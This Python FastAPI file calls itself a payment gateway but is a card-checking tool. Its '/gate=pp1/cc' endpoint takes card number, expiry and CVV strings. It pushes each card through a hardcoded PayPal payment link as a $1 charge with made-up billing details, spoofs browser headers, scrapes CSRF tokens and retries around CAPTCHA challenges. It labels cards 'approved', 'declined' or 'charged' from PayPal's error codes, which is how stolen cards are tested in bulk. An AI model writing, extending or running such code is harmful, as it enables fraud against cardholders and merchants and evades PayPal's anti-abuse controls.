import aiohttp
import asyncio
import json
import logging
import re
from typing import Dict, Optional
from fastapi import FastAPI, HTTPException, Query
from fastapi.responses import JSONResponse
import uvicorn

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize FastAPI App
app = FastAPI(title="Payment Gateway API", version="1.0.0")

# --- Status Mapping Rules ---
APPROVED_CODES = {"INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED"}
DECLINED_CODES = {
    "CARD_GENERIC_ERROR",
    "COUNTRY_NOT_SUPPORTED",
    "EXPIRED_CARD",
    "VALIDATION_ERROR",
    "LOGIN_ERROR",
    "RISK_DISALLOWED",
    "TOKEN_EXTRACTION_ERROR",
    "NETWORK_ERROR",
    "INTERNAL_ERROR",
    "INVALID_MONTH",
    "UNKNOWN_ERROR",
    "SECURITY_CHALLENGE"  # New code for CAPTCHA challenges
}

# --- Constants ---
MAX_ACQUISITION_RETRIES = 3
MAX_CSRF_RETRIES = 3
CSRF_RETRY_DELAY = 2
ACQUISITION_RETRY_DELAY = 3
REQUEST_TIMEOUT = 15
GRAPHQL_TIMEOUT = 20

# Global connector will be initialized in startup event
connector = None

@app.on_event("startup")
async def startup_event():
    """Initialize resources when the app starts."""
    global connector
    connector = aiohttp.TCPConnector(
        limit=100,  # Total connection pool size
        limit_per_host=30,  # Connections per host
        ttl_dns_cache=300,  # DNS cache TTL
        use_dns_cache=True,
        keepalive_timeout=30,
        enable_cleanup_closed=True
    )
    logging.info("Application startup complete")

@app.on_event("shutdown")
async def shutdown_event():
    """Clean up resources when the app shuts down."""
    global connector
    if connector:
        await connector.close()
    logging.info("Application shutdown complete")

def extract_csrf_token(html_content):
    """Extract CSRF token from HTML content with multiple patterns."""
    try:
        patterns = [
            r'"csrfToken":"([^"]+)"',
            r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']',
            r'data-csrf=["\']([^"\']+)["\']',
            r'"token":"([^"]+)"',
            r'name="_token"\s+value="([^"]+)"',
            r'data-csrf-token="([^"]+)"',  # Added for PayPal's specific format
            r'name="_csrf"\s+value="([^"]+)"'  # Added for PayPal's specific format
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        
        logging.warning(f"CSRF token not found. Page content snippet: {html_content[:500]}...")
        return None
    except Exception as e:
        logging.error(f"Error extracting CSRF token: {e}")
        return None

def detect_security_challenge(html_content):
    """Detect if PayPal is presenting a security challenge (CAPTCHA)."""
    challenge_indicators = [
        'data-captcha-type',
        'recaptcha',
        'authcaptcha',
        'security check',
        'challenge'
    ]
    
    content_lower = html_content.lower()
    for indicator in challenge_indicators:
        if indicator in content_lower:
            return True
    
    return False

async def process_paypal_payment(card_details_string: str) -> Dict[str, str]:
    """
    Processes the PayPal payment using the provided card details string.
    The string should be in the format: 'card_number|mm|yy|cvv'
    Returns a dictionary with 'code' and 'message' from the PayPal response.
    """
    # --- 1. Parse and Validate Card Details ---
    parts = card_details_string.split('|')
    if len(parts) != 4:
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid input format. Expected: card_number|mm|yy|cvv'}

    card_number, month, year, cvv = [p.strip() for p in parts]

    if not month.isdigit() or len(month) != 2 or not (1 <= int(month) <= 12):
        return {'code': 'INVALID_MONTH', 'message': 'Invalid expiration month provided.'}
    if not year.isdigit():
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
    if len(year) == 2: year = '20' + year
    elif len(year) != 4: return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid CVV format.'}

    expiry_date = f"{month}/{year}"
    card_type = 'VISA' if card_number.startswith('4') else ('MASTER_CARD' if card_number.startswith('5') else ('AMEX' if card_number.startswith('3') else 'UNKNOWN'))
    currency_conversion_type = 'VENDOR' if card_type == 'AMEX' else 'PAYPAL'
    card_details = {'cardNumber': card_number, 'type': card_type, 'expirationDate': expiry_date, 'securityCode': cvv, 'postalCode': '10010'}

    # --- 2. Execute PayPal Request Sequence with Comprehensive Retry Logic ---
    
    # Using aiohttp.ClientSession for async HTTP requests with connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        token = None
        
        for acquisition_attempt in range(MAX_ACQUISITION_RETRIES):
            csrf_token = None
            for csrf_attempt in range(MAX_CSRF_RETRIES):
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache', 'Pragma': 'no-cache',
                }
                try:
                    async with session.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', headers=headers, timeout=REQUEST_TIMEOUT) as response:
                        response.raise_for_status()
                        html_content = await response.text()
                        
                        # Check for security challenge
                        if detect_security_challenge(html_content):
                            logging.warning("PayPal security challenge detected. This may require manual intervention.")
                            return {'code': 'SECURITY_CHALLENGE', 'message': 'PayPal is requesting additional security verification (CAPTCHA). Please try again later or use a different payment method.'}
                        
                        csrf_token = extract_csrf_token(html_content)
                        if csrf_token:
                            logging.info(f"Successfully extracted CSRF token on attempt {csrf_attempt + 1}.")
                            break
                        else:
                            logging.warning(f"Attempt {csrf_attempt + 1}/{MAX_CSRF_RETRIES}: CSRF token not found. Retrying...")
                except aiohttp.ClientError as e:
                    logging.warning(f"Attempt {csrf_attempt + 1}/{MAX_CSRF_RETRIES}: Network error while fetching initial page: {e}. Retrying...")
                
                if csrf_attempt < MAX_CSRF_RETRIES - 1:
                    await asyncio.sleep(CSRF_RETRY_DELAY)

            if not csrf_token:
                logging.error(f"Failed to extract CSRF token after {MAX_CSRF_RETRIES} attempts on acquisition try {acquisition_attempt + 1}.")
                if acquisition_attempt < MAX_ACQUISITION_RETRIES - 1:
                    await asyncio.sleep(ACQUISITION_RETRY_DELAY)
                    continue
                else:
                    return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract CSRF token from PayPal after multiple retries.'}

            # --- Request 2: Create Order ---
            headers = {
                'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
                'referer': 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'x-csrf-token': csrf_token,
            }
            json_data = {
                'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': '1',
                'currency': 'USD', 'currencySymbol': '$', 'funding_source': 'CARD',
                'button_type': 'VARIABLE_PRICE', 'csrfRetryEnabled': True,
            }
            
            try:
                async with session.post('https://www.paypal.com/ncp/api/create-order', headers=headers, json=json_data, timeout=REQUEST_TIMEOUT) as response:
                    response.raise_for_status()
                    response_data = await response.json()
            except aiohttp.ClientError as e:
                logging.error(f"Network error during create-order call on acquisition try {acquisition_attempt + 1}: {e}")
                if acquisition_attempt < MAX_ACQUISITION_RETRIES - 1:
                    await asyncio.sleep(ACQUISITION_RETRY_DELAY)
                    continue
                else:
                    return {'code': 'NETWORK_ERROR', 'message': 'Failed to connect to PayPal create-order API.'}
            except (json.JSONDecodeError, aiohttp.ContentTypeError):
                logging.error(f"Invalid JSON response from create-order on acquisition try {acquisition_attempt + 1}: {await response.text()}")
                if acquisition_attempt < MAX_ACQUISITION_RETRIES - 1:
                    await asyncio.sleep(ACQUISITION_RETRY_DELAY)
                    continue
                else:
                    return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'PayPal returned an invalid JSON response.'}
            
            if 'context_id' in response_data:
                token = response_data['context_id']
                logging.info(f"Successfully extracted token: {token}")
                break
            else:
                logging.error(f"Token extraction failed on acquisition try {acquisition_attempt + 1}. Status: {response.status}. Response Body: {await response.text()}")
                if acquisition_attempt < MAX_ACQUISITION_RETRIES - 1:
                    logging.warning("Retrying entire token acquisition process...")
                    await asyncio.sleep(ACQUISITION_RETRY_DELAY)
                    continue

        if not token:
            logging.error(f"Failed to extract token after {MAX_ACQUISITION_RETRIES} full acquisition attempts.")
            return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract token from PayPal response after multiple retries.'}

        # --- Request 3: Submit Card Details ---
        headers = {
            'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
            'paypal-client-context': token, 'paypal-client-metadata-id': token,
            'referer': f'https://www.paypal.com/smart/card-fields?token={token}',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-app-name': 'standardcardfields', 'x-country': 'US',
        }

        # GraphQL query
        graphql_query = """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """
        
        json_data = {
            'query': graphql_query.strip(),
            'variables': {
                'token': token, 'card': card_details, 'phoneNumber': '4073320637',
                'firstName': 'Rockcy', 'lastName': 'og',
                'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
                'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
                'email': 'rocky2@gmail.com', 'currencyConversionType': currency_conversion_type,
            }, 'operationName': None,
        }
        
        try:
            async with session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data, timeout=GRAPHQL_TIMEOUT) as response:
                # Check if we got HTML instead of JSON (likely a CAPTCHA challenge)
                content_type = response.headers.get('Content-Type', '')
                if 'text/html' in content_type:
                    html_content = await response.text()
                    if detect_security_challenge(html_content):
                        logging.warning("PayPal security challenge detected during GraphQL request.")
                        return {'code': 'SECURITY_CHALLENGE', 'message': 'PayPal is requesting additional security verification (CAPTCHA). Please try again later or use a different payment method.'}
                
                response_data = await response.json()
        except (json.JSONDecodeError, aiohttp.ContentTypeError) as e:
            logging.error(f"Final GraphQL request failed with JSON error: {e}. Response content-type: {response.headers.get('Content-Type', 'unknown')}")
            return {'code': 'SECURITY_CHALLENGE', 'message': 'PayPal is requesting additional security verification. Please try again later or use a different payment method.'}
        except aiohttp.ClientError as e:
            logging.error(f"Final GraphQL request failed with network error: {e}")
            return {'code': 'INTERNAL_ERROR', 'message': 'Failed to submit payment to PayPal.'}

        # --- 3. Parse PayPal Response ---
        result = {'code': 'TRANSACTION_SUCCESSFUL', 'message': 'Payment processed successfully.'}
        if 'errors' in response_data and response_data['errors']:
            logging.error(f"PayPal GraphQL error: {json.dumps(response_data)}")
            error_data = response_data['errors'][0]
            result['code'] = error_data.get('data', [{}])[0].get('code', 'UNKNOWN_ERROR')
            result['message'] = error_data.get('message', 'An unknown error occurred.')
        
        return result


@app.get('/gate=pp1/cc')
async def payment_gateway(card_details: str = Query(..., description="Card details in format: card_number|mm|yy|cvv")):
    """
    Main endpoint to process a payment.
    URL Format: /gate=pp1/cc?card_details={card_number|mm|yy|cvv}
    """
    last_four = card_details.split('|')[0][-4:] if '|' in card_details and len(card_details.split('|')[0]) >= 4 else '****'
    logging.info(f"Received payment request for card ending in {last_four}")
    
    result = await process_paypal_payment(card_details)
    
    code = result.get('code')
    if code in APPROVED_CODES: status = 'approved'
    elif code in DECLINED_CODES: status = 'declined'
    else: status = 'charged'

    final_response = {"status": status, "code": code, "message": result.get('message')}
    logging.info(f"Transaction result: {final_response}")
    return JSONResponse(content=final_response)


if __name__ == '__main__':
    # Configure uvicorn with appropriate worker settings for high concurrency
    uvicorn.run(
        "app:app",
        host="0.0.0.0",
        port=5000,
        reload=False,
        workers=4,  # Adjust based on your server's CPU cores
        loop="uvloop",  # High performance event loop
        access_log=True
    )
